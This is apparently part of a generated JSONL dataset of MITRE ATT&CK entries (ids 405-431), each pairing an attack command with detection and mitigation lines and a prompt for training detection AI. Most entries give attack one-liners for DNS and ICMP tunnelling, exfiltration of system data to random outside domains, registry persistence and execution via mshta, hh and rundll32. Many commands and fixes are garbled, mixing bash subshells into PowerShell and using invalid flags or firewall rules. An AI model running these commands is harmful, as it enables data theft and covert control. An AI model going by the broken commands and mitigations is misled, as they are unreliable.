{"id":405,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with MX records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor MX queries: `tshark -Y 'dns.qry.type == 15' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block MX DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with MX records by analyzing query patterns, base64-encoded subdomains, and MX record usage; suggest DNS filtering."}
{"id":406,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate hostname via DNS ANY queries.","command":"nslookup -type=ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(hostname | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor ANY queries: `tshark -Y 'dns.qry.type == 255' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of hostname via ANY queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":407,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using sc to create a service for ICMP-based C2 tunneling.","command":"sc create $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) binPath= \"ping -t $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -l 1000 -p $(echo c2cmd | base64 -w0)\" start= auto","detection":"Monitor sc service creation: `wmic service where name='%random%' get pathname | findstr ping`; Event ID 7045.","mitigation":"Restrict sc: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ICMP-based C2 tunneling via sc service creation by analyzing ping commands, base64-encoded patterns, and service creation events; suggest ICMP filtering."}
{"id":408,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Using AppInit DLLs for DNS tunneling persistence.","command":"reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows /v AppInit_DLLs /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor AppInit DLLs: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows | findstr AppInit_DLLs`; Event ID 4657.","mitigation":"Restrict AppInit writes: `regini -h deny HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows`; Disable AppInit: `reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f`.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppInit DLLs for DNS tunneling persistence by analyzing registry changes, DLL paths, and DNS query patterns; suggest registry protections."}
{"id":409,"tactic":"Defense Evasion","technique":"T1218.002: Control Panel","threat":"Using control.exe to execute DNS tunneling CPL file.","command":"control http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cpl) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor control HTTP: `wmic process where name='control.exe' get commandline | findstr http`; YARA rule: `rule ControlDnsTunnel { strings: $a = /control.*http.*cpl/ nocase; condition: $a }`.","mitigation":"Restrict control: `icacls %windir%\\System32\\control.exe /deny Everyone:RX`; Block CPL downloads: `netsh advfirewall firewall add rule name='Block control' dir=out program='%windir%\\System32\\control.exe' action=block`.","references":["MITRE ATT&CK T1218.002: https://attack.mitre.org/techniques/T1218/002/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect control.exe-based DNS tunneling CPL execution by analyzing HTTP downloads, control command-line arguments, and DNS query patterns; suggest CPL download restrictions."}
{"id":410,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with ANY records for DNS tunneling C2.","command":"dig +short ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig ANY queries: `tcpdump -i any port 53 | grep ANY`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with ANY records by analyzing query patterns, base64-encoded subdomains, and ANY record usage; suggest DNS inspection."}
{"id":411,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate user profile data via DNS SRV queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $user = Get-LocalUser | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($user)); Resolve-DnsName -Type SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor user DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-LocalUser`; DNS SRV spikes: `tshark -Y 'dns.qry.type == 33'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block SRV DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell user profile exfiltration via DNS SRV queries by analyzing base64-encoded subdomains, Get-LocalUser execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":412,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via Microsoft Graph API.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://graph.microsoft.com/v1.0/me/drive/root:/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt:/content -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest Graph: `wmic process where name='powershell.exe' get commandline | findstr graph.microsoft.com`; Network traffic: `tshark -Y 'http.host contains graph.microsoft.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Microsoft Graph: `netsh advfirewall firewall add rule name='Block Graph' dir=out action=block remoteip=20.190.128.0/18`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via Microsoft Graph API by analyzing HTTP headers, Graph API endpoints, and file creation patterns; recommend API blocking."}
{"id":413,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Using AppCert DLLs for DNS tunneling persistence.","command":"reg add HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor AppCert DLLs: `reg query HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls | findstr dnstunnel`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppCert DLLs for DNS tunneling persistence by analyzing registry changes, DLL paths, and DNS query patterns; suggest registry protections."}
{"id":414,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute DNS tunneling CHM file.","command":"hh http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor hh HTTP: `wmic process where name='hh.exe' get commandline | findstr http`; YARA rule: `rule HhDnsTunnel { strings: $a = /hh.*http.*chm/ nocase; condition: $a }`.","mitigation":"Restrict hh: `icacls %windir%\\hh.exe /deny Everyone:RX`; Block CHM downloads: `netsh advfirewall firewall add rule name='Block hh' dir=out program='%windir%\\hh.exe' action=block`.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh.exe-based DNS tunneling CHM execution by analyzing HTTP downloads, hh command-line arguments, and DNS query patterns; suggest CHM download restrictions."}
{"id":415,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with SOA records for DNS tunneling C2.","command":"nslookup -type=SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor SOA queries: `tshark -Y 'dns.qry.type == 6' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup SOA queries by analyzing query frequency, base64-encoded subdomains, and SOA record patterns; suggest DNS filtering."}
{"id":416,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate network interfaces via DNS TXT queries.","command":"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(ip addr | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig TXT queries: `tcpdump -i any port 53 | grep TXT`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of network interfaces via TXT queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":417,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using PowerShell to tunnel C2 via DNS over TLS (DoT).","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://1.1.1.1/dns-query?name=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)&type=TXT -Method GET | Out-Null\"","detection":"Monitor DoT traffic: `tshark -Y 'tcp.port == 853' | grep 1.1.1.1`; PowerShell DoT: `wmic process where name='powershell.exe' get commandline | findstr 1.1.1.1`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block DoT: `netsh advfirewall firewall add rule name='Block DoT' dir=out action=block remoteip=1.1.1.1,1.0.0.1`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DoT-based DNS tunneling by analyzing HTTPS requests to DoT resolvers, base64-encoded subdomains, and TXT query patterns; suggest DoT blocking."}
{"id":418,"tactic":"Persistence","technique":"T1546.002: Screensaver","threat":"Using screensaver for DNS tunneling persistence.","command":"reg add HKCU\\Control Panel\\Desktop /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor screensaver registry: `reg query HKCU\\Control Panel\\Desktop | findstr SCRNSAVE.EXE`; Event ID 4657.","mitigation":"Restrict screensaver writes: `regini -h deny HKCU\\Control Panel\\Desktop`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.002: https://attack.mitre.org/techniques/T1546/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect screensaver-based DNS tunneling persistence by analyzing registry changes, executable paths, and DNS query patterns; suggest registry protections."}
{"id":419,"tactic":"Defense Evasion","technique":"T1218.013: Mavinject","threat":"Using mavinject to inject DNS tunneling DLL into process.","command":"mavinject $(tasklist | findstr notepad | awk '{print $2}') /INJECTRUNNING \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor mavinject: `wmic process where name='mavinject.exe' get commandline | findstr dll`; YARA rule: `rule MavinjectDnsTunnel { strings: $a = /mavinject.*dll/ nocase; condition: $a }`.","mitigation":"Restrict mavinject: `icacls %windir%\\System32\\mavinject.exe /deny Everyone:RX`; Block DLL injection: `netsh advfirewall firewall add rule name='Block mavinject' dir=out program='%windir%\\System32\\mavinject.exe' action=block`.","references":["MITRE ATT&CK T1218.013: https://attack.mitre.org/techniques/T1218/013/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mavinject-based DNS tunneling DLL injection by analyzing DLL paths, mavinject command-line arguments, and DNS query patterns; suggest DLL injection restrictions."}
{"id":420,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with NS records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor NS queries: `tshark -Y 'dns.qry.type == 2' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block NS DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with NS records by analyzing query patterns, base64-encoded subdomains, and NS record usage; suggest DNS filtering."}
{"id":421,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate system uptime via DNS MX queries.","command":"nslookup -type=MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(uptime | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor MX queries: `tshark -Y 'dns.qry.type == 15' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of system uptime via MX queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":422,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with AWS Lambda for C2.","command":"curl -H \"x-api-key: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).execute-api.us-east-1.amazonaws.com/prod/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl Lambda: `ps aux | grep curl | grep execute-api`; Network traffic: `tcpdump -i any host execute-api.us-east-1.amazonaws.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Lambda: `iptables -A OUTPUT -d execute-api.us-east-1.amazonaws.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via AWS Lambda by analyzing HTTP headers, Lambda API endpoints, and file creation patterns; recommend API blocking."}
{"id":423,"tactic":"Persistence","technique":"T1546.006: LC_LOAD_DYLIB Addition","threat":"Using LC_LOAD_DYLIB for DNS tunneling persistence on macOS.","command":"echo 'install_name_tool -add_rpath /$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) /usr/bin/bash' | sudo bash","detection":"Monitor dylib additions: `otool -l /usr/bin/bash | grep dnstunnel`; Audit file changes: `auditctl -w /usr/bin/bash -p wa`.","mitigation":"Restrict binary modifications: `chmod 755 /usr/bin/bash`; Enable Gatekeeper: `spctl --master-enable`.","references":["MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect LC_LOAD_DYLIB-based DNS tunneling persistence by analyzing dylib additions, binary modifications, and DNS query patterns; suggest binary protections."}
{"id":424,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with url.dll for DNS tunneling.","command":"rundll32 url.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo nslookup -type=TXT $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 url: `wmic process where name='rundll32.exe' get commandline | findstr url.dll`; YARA rule: `rule Rundll32UrlDnsTunnel { strings: $a = /rundll32.*url.dll.*nslookup/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 url.dll-based DNS tunneling by analyzing nslookup TXT queries, rundll32 command-line arguments, and DNS traffic patterns; suggest DNS restrictions."}
{"id":425,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with AAAA records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor AAAA queries: `tshark -Y 'dns.qry.type == 28' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block AAAA DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with AAAA records by analyzing query patterns, base64-encoded subdomains, and AAAA record usage; suggest DNS filtering."}
{"id":426,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate disk usage via DNS SRV queries.","command":"nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(df -h | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor SRV queries: `tshark -Y 'dns.qry.type == 33' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of disk usage via SRV queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":427,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via Azure Blob Storage.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).blob.core.windows.net/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest Azure: `wmic process where name='powershell.exe' get commandline | findstr blob.core.windows.net`; Network traffic: `tshark -Y 'http.host contains blob.core.windows.net'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Azure Blob: `netsh advfirewall firewall add rule name='Block Azure Blob' dir=out action=block remoteip=20.150.0.0/15`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via Azure Blob Storage by analyzing HTTP requests, Azure Blob URLs, and file creation patterns; recommend blob storage blocking."}
{"id":428,"tactic":"Persistence","technique":"T1546.001: Netsh Helper DLL","threat":"Using netsh to register DNS tunneling helper DLL for persistence.","command":"netsh add helper http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor netsh helper: `wmic process where name='netsh.exe' get commandline | findstr helper`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block Netsh' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect netsh helper DLL registrations for DNS tunneling by analyzing HTTP-based DLL downloads and netsh command-line arguments; suggest firewall rules."}
{"id":429,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta to execute DNS tunneling VBScript payload.","command":"mshta vbscript:Execute(\"CreateObject('WScript.Shell').Run('nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)');Close\")","detection":"Monitor mshta VBScript: `wmic process where name='mshta.exe' get commandline | findstr nslookup`; YARA rule: `rule MshtaVbsDnsTunnel { strings: $a = /mshta.*vbscript.*nslookup/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block mshta DNS' dir=out program='%windir%\\System32\\mshta.exe' action=block`.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta-based DNS tunneling via VBScript by analyzing nslookup TXT queries, mshta command-line arguments, and DNS traffic patterns; suggest DNS restrictions."}
{"id":430,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with CNAME records for DNS tunneling C2.","command":"dig +short CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig CNAME queries: `tcpdump -i any port 53 | grep CNAME`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with CNAME records by analyzing query patterns, base64-encoded subdomains, and CNAME record usage; suggest DNS inspection."}
{"id":431,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate system roles via DNS ANY queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $roles = Get-WindowsFeature | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($roles)); Resolve-DnsName -Type ANY $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor roles DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-WindowsFeature`; DNS ANY spikes: `tshark -Y 'dns.qry.type == 255'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block ANY DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell system roles exfiltration via DNS ANY queries by analyzing base64-encoded subdomains, Get-WindowsFeature execution, and DNS traffic patterns; suggest DNS filtering."}
